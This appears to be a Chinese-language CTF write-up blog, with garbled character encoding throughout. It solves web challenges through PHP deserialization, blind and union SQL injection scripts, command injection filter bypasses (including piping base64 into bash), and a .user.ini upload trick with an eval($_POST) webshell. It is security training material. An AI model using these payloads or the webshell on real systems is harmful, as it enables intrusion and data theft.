æœ€åè¿›è¡Œurlç¼–ç å°±è¡Œã€‚ [ZJCTF 2019]NiZhuanSiWeiçœ‹æºç  12345678910111213141516171819&lt;?php $text = $_GET[\"text\"];$file = $_GET[\"file\"];$password = $_GET[\"password\"];if(isset($text)&amp;&amp;(file_get_contents($text,'r')===\"welcome to the zjctf\"))&#123; echo \"&lt;br&gt;&lt;h1&gt;\".file_get_contents($text,'r').\"&lt;/h1&gt;&lt;/br&gt;\"; //textçš„å†…å®¹ä¸ºwelcome to the zjctf if(preg_match(\"/flag/\",$file))&#123; echo \"Not now!\"; //fileçš„å†…å®¹ä¸èƒ½åŒ…å«flag exit(); &#125;else&#123; include($file); //useless.php $password = unserialize($password); //ååºåˆ—åŒ– echo $password; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; çœ‹æºç çŸ¥é“å…±æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œæ‰€ä»¥ä¾æ¬¡åˆ¤æ–­ textçš„å†…å®¹ä¸ºwelcome to the zjctfï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨dataåè®® 12text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctftext&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D; ä¹‹åæ˜¯fileï¼Œé¢˜ä¸­å·²ç»æç¤ºäº†useless.phpï¼Œè¯´æ˜æˆ‘ä»¬é¦–å…ˆå¾—æ‹¿å‡ºæºç ï¼Œä¹‹ååŒ…å«è¿™ä¸ªæ–‡ä»¶ 1file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php æ‹¿å‡ºæºç  12345678910111213&lt;?php class Flag&#123; //flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo \"&lt;br&gt;\"; return (\"U R SO CLOSE !///COME ON PLZ\"); &#125; &#125; &#125; ?&gt; ä¹‹åå°±æ˜¯passwordï¼Œå¾ˆæ˜æ˜¾æ˜¯åºåˆ—åŒ– 1O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 1http:&#x2F;&#x2F;5bfc7735-e6c3-4e4b-9612-573138d921bd.node3.buuoj.cn&#x2F;?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; æŸ¥çœ‹æºç å°±æœ‰flag [ç½‘é¼æ¯ 2018]Fakebookï¼ˆæŠ¥é”™æ³¨å…¥å’Œååºåˆ—åŒ–ï¼‰é¦–å…ˆå‘ç°ä¿¡æ¯æ³„éœ² 1&#x2F;user.php.bak 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?phpclass UserInfo&#123; public $name = \"\"; public $age = 0; public $blog = \"\"; public function __construct($name, $age, $blog) &#123; $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; &#125; function get($url) &#123; //åˆ›å»ºä¸€ä¸ªcurlèµ„æº $ch = curl_init(); //è®¾ç½®urlå’Œç›¸åº”çš„é€‰é¡¹ curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); //æŠ“å–urlå¹¶ä¼ é€’ç»™æµè§ˆå™¨ $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) &#123; return 404; &#125; //å…³é—­curlèµ„æºï¼Œå¹¶ä¸”é‡Šæ”¾ç³»ç»Ÿèµ„æº curl_close($ch); //å”¯ä¸€çš„å‚æ•°æ˜¯curl_init()å‡½æ•°è¿”å›çš„å¥æŸ„ return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog = $this-&gt;blog; return preg_match(\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i\", $blog); &#125;&#125; æ‰¾äº†å¥½é•¿æ—¶é—´ï¼Œæ‰¾ä¸åˆ°æ³¨å…¥ç‚¹ åæ¥å‘ç°ï¼Œç™»å½•ä¹‹åï¼Œå¯ä»¥æŸ¥çœ‹ä¸€äº›ä¿¡æ¯ å¹¶ä¸”å¾ˆé‡è¦çš„æ˜¯view.phpä¸­noæ˜¯å¯ä»¥æ³¨å…¥çš„ 12345678910111213141516171819import requestsdic ='''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'\"|\\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''url = \"\"flag = ''for i in range(1,50): for j in range(32,128): payload = \"http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;,2,3)\".format(i,j); r = requests.get(url=payload) if \"Fatal\" not in r.text: print(payload) flag += str(chr(j)) break print(flag)payload = \"http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;,2,3)\".format(i,j);#userspayload = 'http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(column_name) from information_schema.columns where table_name=\"users\"),&#123;&#125;,1))=&#123;&#125;,2,3)'.format(i,j);#no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONSpayload = 'http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(data) from users),&#123;&#125;,1))=&#123;&#125;,2,3)'.format(i,j);#O:8:\"UserInfo\":3:&#123;s:4:\"name\";s:5:\"admin\";s:3:\"age\";i:11;s:4:\"blog\";s:8:\"pz1o.top\";&#125; å…¶å®ä¹Ÿå¯ä»¥æŠ¥é”™æ³¨å…¥ï¼Œä½†å½“æ—¶ä»¥ä¸º0x7eè¢«banäº†ä¹‹åå°±ä¸èƒ½æŠ¥é”™äº†ï¼Œtcl 12345671%20and%20extractvalue(1,concat(%27$%27,(select(group_concat(database()))))%23fakebook1%20and%20extractvalue(1,concat(%27$%27,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())))%23users1%20and%20extractvalue(1,concat(%27$%27,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27)))%23no,username,passwd,data,USER,CU1%20and extractvalue(%27$%27,concat(%27$%27,(select data%20from%20users)))%23 åšåˆ°è¿™å…¶å®å°±ä¸ä¼šåšäº†ã€‚ã€‚ã€‚çœ‹å¤§å¸ˆå‚…çš„wpæ‰çŸ¥é“å¯ä»¥noå‚æ•°æ³¨å…¥ååºåˆ—åŒ– å…¶ä¸­payloadä¸º 10%20union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,%27O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;%27%23 è‡³äºä¸ºä»€ä¹ˆä¼šæƒ³åˆ°è¿™ä¸ªï¼Œé¦–å…ˆdataä¸­å°±æ˜¯ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”ï¼Œæœ€åä¸€ä¸ªblogå†…å®¹ä¼šè¢«æ˜¾ç¤ºå‡ºæ¥ï¼Œè¿™æ ·å°±å¸Œæœ›ä»blogä¸­è·å¾—flag å‘½ä»¤æ‰§è¡Œ[GXYCTF2019]Ping Ping Pingï¼ˆè¿‡æ»¤ç©ºæ ¼å’Œæœ‰é»‘åå•ï¼‰ç›´æ¥pingå‘½ä»¤æ‰§è¡Œ ç”¨åˆ†å·æ‰§è¡Œä¸¤ä¸ªå‘½ä»¤ 1?ip&#x3D;8.8.8.8;ls æŸ¥çœ‹æœ‰flag.phpï¼Œé‡è¦çš„å°±æ˜¯æ€ä¹ˆå»è¯»å–flag.php è¿™é‡Œå‘ç°è¿‡æ»¤äº†ç©ºæ ¼ï¼Œæ‰€ä»¥ç»•è¿‡ç©ºæ ¼çš„åŠæ³•ï¼Œç®€å•æ¥è¯´æœ‰ä¸¤ç§ï¼Œç¬¬ä¸€ç§æ˜¯${IFS} ```root@kali:~# cat flagthis is your flagroot@kali:~# cat${IFS}flagthis is your flag 122. root@kali:~# cat${IFS}$1flagthis is your flag 123. root@kali:~# cat$IFS$1flagthis is your flag 1234ç¬¬äºŒç§å‘¢æ˜¯é‡å®šå‘ç¬¦1. root@kali:~# cat&lt;&gt;flagthis is your flag 122. root@kali:~# cat&lt;flagthis is your flag 12345678è¿™é‡Œå‘¢æˆ‘ä»¬é€‰ç”¨$&#123;IFS&#125;æ¥ç»•è¿‡ï¼Œä¹‹ååˆå‘ç°&#123;&#125;è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥ç”¨ç¬¬ä¸‰ä¸ªæ–¹å¼![image-20200831164017570](BUU%E5%88%B7%E9%A2%98&#x2F;image-20200831164017570.png)è¿™æ—¶ï¼Œæˆ‘ä»¬å‘ç°flagä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥**é»‘åå•ç»•è¿‡åˆæœ‰å‡ ç§æ–¹å¼**1. æ‹¼æ¥ root@kali:~# a=c;b=at;c=fl;d=ag;$a$b $c$dthis is your flag 122. base64ç¼–ç  root@kali:~# echo &quot;Y2F0IGZsYWc=&quot;|base64 -dthis is your flag root@kali:~# echo â€œY2F0IGZsYWc=â€|base64 -d|bashthis is your flag 123. å•å¼•å·ã€åŒå¼•å· root@kali:~# câ€â€at flâ€™â€™agthis is your flag 124. åæ–œçº¿ root@kali:~# c\\at fl\\agthis is your flag 12è¿™é‡Œç›´æ¥æ‹¼æ¥è¿‡å»å°±å¥½ ?ip=8.8.8.8;a=g;cat$IFS$1fla$a.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263å³å¯æ‹¿åˆ°flag**ä¸»è¦æ˜¯ç»•è¿‡ç©ºæ ¼å’Œç»•è¿‡é»‘åå•**## [RoarCTF 2019]Easy Calcï¼ˆphpå­—ç¬¦ä¸²è§£æï¼‰æ‰“å¼€æºç ï¼Œå‘ç°calc.php ï¼Œç„¶åè®¿é—®calc.php![image-20200901155413352](BUU%E5%88%B7%E9%A2%98&#x2F;image-20200901155413352.png)numå˜é‡è¿‡æ»¤äº†ä¸€äº›ä¸œè¥¿ï¼Œä½†æˆ‘ä»¬ç”¨ä¸€äº›å‡½æ•°å»è®¿é—®æ—¶ï¼Œä¼šå‘ç°403æ‹’ç»è®¿é—®ï¼Œè¯´æ˜æœ‰wafé€šè¿‡ç½‘ä¸ŠæŸ¥æ‰¾ï¼Œæ˜¯**phpçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§**&gt; PHPéœ€è¦å°†æ‰€æœ‰å‚æ•°è½¬æ¢ä¸ºæœ‰æ•ˆçš„å˜é‡åï¼Œå› æ­¤åœ¨è§£ææŸ¥è¯¢å­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¼šåšä¸¤ä»¶äº‹ï¼š&gt;&gt; 1.åˆ é™¤ç©ºç™½ç¬¦ &gt;&gt; 2.å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰ã€å½“wafä¸è®©ä½ è¿‡çš„æ—¶å€™ï¼Œphpå´å¯ä»¥è®©ä½ è¿‡ã€‘å…ˆè¯•ä¸€è¯•phpinfo();å¯ä»¥ç”¨è¯´æ˜æˆ‘ä»¬å°±æˆåŠŸäº†ã€‚æ¥ä¸‹æ¥ï¼Œå°±æ˜¯è¯»å–ç›®å½•ï¼Œæ‰¾flagäº†ï¼Œä»phpinfoä¸­æˆ‘ä»¬å¯ä»¥çœ‹è§ä¸€äº›å¤–éƒ¨å‡½æ•°è¢«banäº†è¿™æ—¶å°±éœ€è¦ä»‹ç»ä»¥ä¸‹å‡ ä¸ªå‡½æ•°1. **scandir() å‡½æ•°**: è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚2. **base_convert(number,formbase,tobase) å‡½æ•°**: åœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—ã€‚3. **dechex() å‡½æ•°**ï¼š æŠŠåè¿›åˆ¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶ã€‚4. **hex2bin() å‡½æ•°**ï¼š æŠŠåå…­è¿›åˆ¶å€¼çš„å­—ç¬¦ä¸²è½¬æ¢ä¸º ASCII å­—ç¬¦ã€‚5. **readfile() å‡½æ•°**: è¾“å‡ºä¸€ä¸ªæ–‡ä»¶ã€‚6. **chr()å‡½æ•°** åè¿›åˆ¶è¿”å›asciiå­—ç¬¦7. **ord()å‡½æ•°** asciiå­—ç¬¦è½¬æ¢ä¸ºåè¿›åˆ¶8. **file_get_contents()** æŠŠæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­é€šå¸¸ä¼šç”¨hex2bin(dechex(47))ä¸€èµ·ä½¿ç”¨ï¼Œè¿™ä¸ªè¡¨ç¤º&#x2F;è¿™é‡Œ&#x2F;è¢«è¿‡æ»¤äº†æ‰€ä»¥payloadå¯ä»¥ä¸º ? num=var_dump(scandir(chr(47)))? num=var_dump(scandir(hex2bin(dechex(47)))) 12å‘ç°flagç›´æ¥readfileè¯»å–å³å¯ ? num=var_dump(readfile(chr(47).f1agg))? num=file_get_contents(chr(47).f1agg) 12è¿˜æœ‰å…¶ä»–çš„payload ? num=base_convert(55490343972,10,36)() 1234## [ACTF2020 æ–°ç”Ÿèµ›]Execç›´æ¥æŸ¥å°±å¯ä»¥ 8.8.8.8;ls /8.8.8.8;cat /flag 1234## [æå®¢å¤§æŒ‘æˆ˜ 2019]Httpæ”¹è¯·æ±‚åŒ…xffï¼Œuaï¼Œrefã€‚ GET /Secret.php HTTP/1.1Host: node3.buuoj.cn:28918User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0 SycloverAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0referer: https://www.Sycsecret.comX-Forwarded-for: 127.0.0.1 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960# æ–‡ä»¶ä¸Šä¼ ## [SUCTF 2019]CheckInï¼ˆ.user.iniï¼‰&#96;&#96;&#96;php&lt;!DOCTYPE html&gt;&lt;html lang&#x3D;&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt; &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt; &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt; &lt;title&gt;Upload Labs&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt; &lt;h2&gt;Upload Labs&lt;&#x2F;h2&gt; &lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt; &lt;label for&#x3D;&quot;file&quot;&gt;æ–‡ä»¶åï¼š&lt;&#x2F;label&gt; &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;fileUpload&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt; &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;upload&quot; value&#x3D;&quot;æäº¤&quot;&gt; &lt;&#x2F;form&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&lt;?php&#x2F;&#x2F; error_reporting(0);$userdir &#x3D; &quot;uploads&#x2F;&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]); &#x2F;&#x2F;è¿™ä¸ªæ˜¯åˆå§‹ç›®å½•if (!file_exists($userdir)) &#123; mkdir($userdir, 0777, true); &#x2F;&#x2F;å¦‚æœä¸å­˜åœ¨ï¼Œå°±å°†åˆ›å»ºç›®å½•å¯å†™å¯æ‰§è¡Œ&#125;file_put_contents($userdir . &quot;&#x2F;index.php&quot;, &quot;&quot;);if (isset($_POST[&quot;upload&quot;])) &#123; $tmp_name &#x3D; $_FILES[&quot;fileUpload&quot;][&quot;tmp_name&quot;]; $name &#x3D; $_FILES[&quot;fileUpload&quot;][&quot;name&quot;]; if (!$tmp_name) &#123; &#x2F;&#x2F;åˆ¤æ–­æ˜¯å¦å­˜åœ¨ä¸Šä¼ æ–‡ä»¶ die(&quot;filesize too big!&quot;); &#125; if (!$name) &#123; &#x2F;&#x2F;æ–‡ä»¶åä¸è®¸ä¸ºç©º die(&quot;filename cannot be empty!&quot;); &#125; $extension &#x3D; substr($name, strrpos($name, &quot;.&quot;) + 1); &#x2F;&#x2F;æˆªå–åç¼€å if (preg_match(&quot;&#x2F;ph|htacess&#x2F;i&quot;, $extension)) &#123; die(&quot;illegal suffix!&quot;); &#x2F;&#x2F;æ­£åˆ™åŒ¹é…ï¼Œphå’Œhtaccesséƒ½ä¸å¯ä»¥ &#125; if (mb_strpos(file_get_contents($tmp_name), &quot;&lt;?&quot;) !&#x3D;&#x3D; FALSE) &#123; die(&quot;&lt;? in contents!&quot;); &#x2F;&#x2F;æ–‡ä»¶å†…å®¹ä¸è®¸æœ‰&lt;? &#125; $image_type &#x3D; exif_imagetype($tmp_name); &#x2F;&#x2F;åˆ¤æ–­ä¸€ä¸ªå›¾åƒçš„ç±»å‹ if (!$image_type) &#123; die(&quot;exif_imagetype:not image!&quot;); &#125; $upload_file_path &#x3D; $userdir . &quot;&#x2F;&quot; . $name; move_uploaded_file($tmp_name, $upload_file_path); echo &quot;Your dir &quot; . $userdir. &#39; &lt;br&gt;&#39;; echo &#39;Your files : &lt;br&gt;&#39;; var_dump(scandir($userdir));&#125; æºç å¦‚ä¸Šï¼Œå¯ä»¥å­¦ä¹ ä¸€ä¸‹ å…¶ä¸­exif_imagetype()å¯ä»¥è®°å½•ä¸€ä¸‹ ä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡ç»™ä¸Šä¼ è„šæœ¬åŠ ä¸Šç›¸åº”çš„å¹»æ•°å¤´å­—èŠ‚å°±å¯ä»¥ç»•è¿‡ï¼š JPG ï¼šFF D8 FF E0 00 10 4A 46 49 46 GIF(ç›¸å½“äºæ–‡æœ¬çš„GIF89a)ï¼š47 49 46 38 39 61 PNGï¼š 89 50 4E 47 è¿™é‡Œæƒ³è¦ä¸Šä¼ æˆåŠŸï¼Œè¦å€ŸåŠ©ä¸€ä¸‹.user.ini https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html .user.iniå®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªå¯ä»¥ç”±ç”¨æˆ·â€œè‡ªå®šä¹‰â€çš„php.iniï¼Œæˆ‘ä»¬èƒ½å¤Ÿè‡ªå®šä¹‰çš„è®¾ç½®æ˜¯æ¨¡å¼ä¸ºâ€œPHP_INI_PERDIR ã€ PHP_INI_USERâ€çš„è®¾ç½®ã€‚ï¼ˆä¸Šé¢è¡¨æ ¼ä¸­æ²¡æœ‰æåˆ°çš„PHP_INI_PERDIRä¹Ÿå¯ä»¥åœ¨.user.iniä¸­è®¾ç½®ï¼‰ å…¶ä¸­æœ‰ä¸¤ä¸ªé…ç½®ï¼Œå¯ä»¥ç”¨æ¥åˆ¶é€ åé—¨ï¼šauto_append_fileã€auto_prepend_fileæŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œè‡ªåŠ¨åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶å‰ï¼Œç±»ä¼¼äºåœ¨æ–‡ä»¶å‰è°ƒç”¨äº†require()å‡½æ•°ã€‚è€Œauto_append_fileç±»ä¼¼ï¼Œåªæ˜¯åœ¨æ–‡ä»¶åé¢åŒ…å«ã€‚ ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œç›´æ¥å†™åœ¨.user.iniä¸­ï¼š 1&gt;auto_prepend_file&#x3D;test.jpg é‚£ä¹ˆå½“æˆ‘ä»¬è®¿é—®æ­¤ç›®å½•ä¸‹çš„ä»»ä½•ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå»åŒ…å«test.jpg å¸¸è§å§¿åŠ¿ï¼š æ¯”å¦‚ï¼ŒæŸç½‘ç«™é™åˆ¶ä¸å…è®¸ä¸Šä¼ .phpæ–‡ä»¶ï¼Œä½ ä¾¿å¯ä»¥ä¸Šä¼ ä¸€ä¸ª.user.iniï¼Œå†ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼ŒåŒ…å«èµ·æ¥è¿›è¡Œgetshellã€‚ä¸è¿‡å‰ææ˜¯å«æœ‰.user.iniçš„æ–‡ä»¶å¤¹ä¸‹éœ€è¦æœ‰æ­£å¸¸çš„phpæ–‡ä»¶ï¼Œå¦åˆ™ä¹Ÿä¸èƒ½åŒ…å«äº†ã€‚ è¿™é‡Œæœ€åå°±è¦å†™ä¸€ä¸ªå›¾ç‰‡é©¬äº† 1&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;a&#39;]);&lt;&#x2F;script&gt; ç„¶åæŠŠä¸¤ä¸ªä¸Šä¼ ï¼Œè¿èœåˆ€å°±å¯ä»¥æ‹¿åˆ°flagäº† ä¸»è¦æ¥å­¦ä¹ ä¸€ä¸‹æ–‡ä»¶ä¸Šä¼ çš„æ“ä½œ [æå®¢å¤§æŒ‘æˆ˜ 2019]Uploadè¿™ä¸ªç›´æ¥ä¸Šä¼ å°±å¯ä»¥ï¼Œæ”¹ä¸€ä¸‹æ–‡ä»¶å†…å®¹çš„å¤´ï¼Œç„¶åæ”¹ä¸‹æ–‡ä»¶åphtml èœåˆ€è¿æ¥æ‹¿flag [ACTF2020 æ–°ç”Ÿèµ›]BackupFileå¤‡ä»½æ–‡ä»¶index.php.bak ä¸¤ä¸ªç­‰å·å¼±ç­‰äºï¼Œç›´æ¥123æ‹¿flag [ACTF2020 æ–°ç”Ÿèµ›]Uploadä¸Šä¼ æ”¹åå­—ï¼Œæ‹¿flag [æå®¢å¤§æŒ‘æˆ˜ 2019]Knifeç›´æ¥èœåˆ€è¿æ¥ï¼Œæ ¹ç›®å½•ä¸‹æœ‰flag","categories":[{"name":"BUU","slug":"BUU","permalink":"https://pz1o.top/categories/BUU/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://pz1o.top/tags/CTF/"},{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"https://pz1o.top/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"CUMTCTF2020","slug":"CUMTCTF2020","date":"2020-09-25T11:00:00.000Z","updated":"2020-11-20T14:18:32.426Z","comments":true,"path":"2020/09/25/CUMTCTF2020/","link":"","permalink":"https://pz1o.top/2020/09/25/CUMTCTF2020/","excerpt":"","text":"CUMTCTF2020ç¬¬ä¸€æ¬¡æ‰“æ¯”èµ›ï¼Œå¤§ä¸‰çš„å¸ˆå‚…ä»¬å¥½å¼º webWebç­¾åˆ° getä¼ å…¥å‚æ•°1ï¼Œpostä¼ å…¥å‚æ•°2ï¼Œç„¶åæ–‡ä»¶åŒ…å«flag.phpï¼ŒæŸ¥çœ‹æºç æ‹¿flag 1#CUMTCTF&#123;179055b4-e8f5-42d2-bfe4-027d15e946b2&#125; Babysqliè¿‡æ»¤ç©ºæ ¼çš„sqlæ³¨å…¥ï¼Œå¯ä»¥ç”¨/**/ç»•è¿‡,ç”¨unionæ³¨å…¥ payload 123456789#æŸ¥è¡¨1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database()),5,6,7,8##emails,users1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,(select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&#39;emails&#39;),5,6,7,8##id,email_id1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,(select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&#39;users&#39;),5,6,7,8##user_id,first_name,last_name,user,password,avatar,last_login,failed_login1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,(select&#x2F;**&#x2F;group_concat(password)&#x2F;**&#x2F;from&#x2F;**&#x2F;users),5,6,7,8##CUMTCTF&#123;27ec8034-c9fe-0cfd-d92a-84362ecf0e42&#125; Secret1view-source:http:&#x2F;&#x2F;202.119.201.197:13005&#x2F;secret.jpg ç›´æ¥çœ‹å›¾ç‰‡çš„æºä»£ç ï¼Œå‘ç°åé¢æœ‰php 1234567891011121314151617181920212223242526272829303132&lt;?phperror_reporting(0);include_once('flag.php');if(isset($_GET['param1']))&#123; $str1=$_GET['param1']; if(file_get_contents($str1)!=='Suvin_wants_a_girlfriend') die(\"Suvin doesn't like you\"); if(isset($_GET['param2']))&#123; $str2=$_GET['param2']; if(!is_numeric($str2)) die('Suvin prefers strings of Numbers'); else if($str2&lt;3600*24*30) die('Suvin says the num is too short'); else if($str2&gt;3600*24*31) die('Suvin says the num is too long'); else &#123; echo \"Suvin says he's falling in love with you!\".\"&lt;/br&gt;\"; sleep(intval($str2)); &#125; if (isset($_POST['param1']) &amp;&amp; isset($_POST['param2'])) &#123; $str1=$_POST['param1']; $str2=$_POST['param2']; if(strlen($str1)&gt;1000) die(\"It's too long\"); if(((string)$str1!==(string)$str2)&amp;&amp;(sha1($str1)===sha1($str2))) echo $flag; else die(\"It's so similar to md5\"); &#125; &#125;&#125; é¦–å…ˆgetä¼ å…¥param1è¦å’Œä¸€ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰å¯ä»¥ç”¨data:// getä¼ å…¥param2è¦åˆ¤æ–­è¿™ä¸ªå‚æ•°æ˜¯å¦æ˜¯æ•°å­—å¹¶ä¸”è¦é™åˆ¶äº†èŒƒå›´ï¼Œåœ¨åŠ ä¸Šæœ‰sleepï¼Œå¾ˆè‡ªç„¶çš„å°±æƒ³åˆ°äº†ç§‘å­¦è®¡æ•°æ³• å› æ­¤payload 1http:&#x2F;&#x2F;202.119.201.197:13005&#x2F;index.php?param2&#x3D;0.26e07&amp;param1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,Suvin_wants_a_girlfriend æ¥ä¸‹æ¥æ˜¯postçš„ä¸¤ä¸ªå‚æ•°è¦çš„æ˜¯å­—ç¬¦ä¸²ä¸‹çš„å‚æ•°1å’Œå‚æ•°2ä¸å¼ºç­‰ï¼Œä½†sha1åŠ å¯†å¼ºç­‰ï¼Œè¿™é‡Œå°±ä¸èƒ½ç”¨zheæ•°ç»„ç»•è¿‡äº† è¿™é‡Œæ‰¾ä¸¤ä¸ªsha1åŠ å¯†çš„ä¸ä¸€æ ·çš„å­—ç¬¦ä¸²,æ‰¾çš„æ˜¯é‚£ä¸ªpdfï¼Œç„¶åæå–å‰é¢çš„å†…å®¹å³å¯ï¼Œæœ€åæŠ“åŒ…æ”¹å‚æ•°1å’Œå‚æ•°2æ‹¿flag Babysqli2è¿‡æ»¤äº†å•å¼•å·å’Œå­—ç¬¦ä¸²æˆªæ–­å‡½æ•°substr()å’Œmid()å¹¶ä¸”æ— å›æ˜¾ï¼Œå› ä¸ºæœ‰æ­£ç¡®å’Œé”™è¯¯ç™»å½•ç•Œé¢é‚£åº”è¯¥å°±æ˜¯ç›²æ³¨äº† è¿™é‡Œç”¨leftæ¥æˆªå–å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”ç”¨åå…­è¿›åˆ¶æ¥æ›¿æ¢å•å¼•å·åŠå…¶é‡Œé¢çš„å†…å®¹ ç›´æ¥æ”¾è„šæœ¬ 1234567891011121314151617181920212223242526272829import binasciiimport requests#dict = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.-&#123;&#125;,'dict='''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'\"|\\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''url = 'http://202.119.201.197:13004/index.php'flag = ''j = ''for i in range(1,400): for a in dict: #payload = 